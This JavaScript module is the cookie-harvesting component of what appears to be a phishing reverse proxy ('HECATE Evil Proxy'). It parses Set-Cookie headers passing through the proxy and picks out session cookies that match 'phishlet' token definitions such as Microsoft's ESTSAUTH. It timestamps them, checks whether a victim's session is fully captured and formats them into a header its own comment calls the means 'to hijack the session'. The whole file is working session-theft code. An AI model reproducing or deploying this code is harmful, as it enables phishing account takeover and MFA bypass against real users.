'use strict';

/**
 * HECATE Evil Proxy — Cookie Jar (Harvester)
 * Parses Set-Cookie headers from proxied responses and identifies
 * session cookies that match the phishlet's authTokens definitions.
 *
 * Captured cookies are never logged in cleartext beyond this module.
 * The cookie store writes only to the encrypted evil-proxy-store.
 *
 * Pure functions — no side effects, fully testable.
 */

/**
 * Parse a single Set-Cookie header string into a structured object.
 * @param {string} raw  - e.g. "ESTSAUTH=abc123; Domain=.microsoftonline.com; Path=/; Secure; HttpOnly"
 * @returns {ParsedCookie|null}
 */
function parseCookie(raw) {
  if (!raw || typeof raw !== 'string') return null;

  const parts  = raw.split(';').map(p => p.trim());
  const [nameVal, ...attrs] = parts;

  const eqIdx = nameVal.indexOf('=');
  if (eqIdx === -1) return null;

  const name  = nameVal.slice(0, eqIdx).trim();
  const value = nameVal.slice(eqIdx + 1).trim();

  if (!name) return null;

  const cookie = { name, value, domain: null, path: '/', secure: false, httpOnly: false, sameSite: null, expires: null };

  for (const attr of attrs) {
    const [k, ...rest] = attr.split('=');
    const key  = k.trim().toLowerCase();
    const val  = rest.join('=').trim();

    if (key === 'domain')   cookie.domain   = val || null;
    if (key === 'path')     cookie.path     = val || '/';
    if (key === 'secure')   cookie.secure   = true;
    if (key === 'httponly') cookie.httpOnly = true;
    if (key === 'samesite') cookie.sameSite = val;
    if (key === 'expires')  cookie.expires  = val;
    if (key === 'max-age')  cookie.maxAge   = parseInt(val, 10);
  }

  return cookie;
}

/**
 * Parse multiple Set-Cookie header values.
 * @param {string|string[]} headers
 * @returns {ParsedCookie[]}
 */
function parseAll(headers) {
  const arr = Array.isArray(headers) ? headers : (headers ? [headers] : []);
  return arr.map(parseCookie).filter(Boolean);
}

/**
 * Check if a parsed cookie matches any of the phishlet's authToken definitions.
 * @param {ParsedCookie}  cookie
 * @param {object[]}      authTokens   - from phishlet
 * @returns {{ matched: boolean, tokenDef: object|null }}
 */
function matchAuthToken(cookie, authTokens) {
  for (const def of authTokens) {
    const domainMatch = !def.domain ||
      cookie.domain === def.domain ||
      cookie.domain?.endsWith(def.domain) ||
      def.domain.endsWith(cookie.domain ?? '');

    if (!domainMatch) continue;

    for (const key of def.keys) {
      // Exact name match or glob (key ending with *)
      const matches = key.endsWith('*')
        ? cookie.name.startsWith(key.slice(0, -1))
        : cookie.name === key;

      if (matches) return { matched: true, tokenDef: def };
    }
  }
  return { matched: false, tokenDef: null };
}

/**
 * Extract all auth token cookies from a Set-Cookie header set.
 * @param {string|string[]} setCookieHeaders
 * @param {object[]}        authTokens
 * @returns {CapturedCookie[]}
 */
function harvest(setCookieHeaders, authTokens) {
  const cookies  = parseAll(setCookieHeaders);
  const captured = [];

  for (const cookie of cookies) {
    const { matched, tokenDef } = matchAuthToken(cookie, authTokens);
    if (matched) {
      captured.push({
        name:      cookie.name,
        value:     cookie.value,
        domain:    cookie.domain,
        path:      cookie.path,
        secure:    cookie.secure,
        httpOnly:  cookie.httpOnly,
        sameSite:  cookie.sameSite,
        expires:   cookie.expires,
        tokenDef,
        capturedAt: new Date().toISOString(),
      });
    }
  }

  return captured;
}

/**
 * Check if all required auth tokens for a phishlet have been captured.
 * @param {string[]}       capturedNames  - cookie names already captured
 * @param {object[]}       authTokens     - phishlet authTokens
 * @returns {{ complete: boolean, missing: string[] }}
 */
function isSessionComplete(capturedNames, authTokens) {
  const captured = new Set(capturedNames);
  const missing  = [];

  for (const def of authTokens) {
    // At least one key from each token definition must be captured
    const hasAny = def.keys.some(k =>
      k.endsWith('*')
        ? [...captured].some(n => n.startsWith(k.slice(0, -1)))
        : captured.has(k)
    );
    if (!hasAny) missing.push(...def.keys);
  }

  return { complete: missing.length === 0, missing };
}

/**
 * Format captured cookies as a Cookie header string for replaying.
 * This is what an attacker would use to hijack the session.
 * Value is stored encrypted — this format is for display in the UI only.
 */
function toCookieHeader(capturedCookies) {
  return capturedCookies
    .map(c => `${c.name}=${c.value}`)
    .join('; ');
}

module.exports = {
  parseCookie,
  parseAll,
  matchAuthToken,
  harvest,
  isSessionComplete,
  toCookieHeader,
};
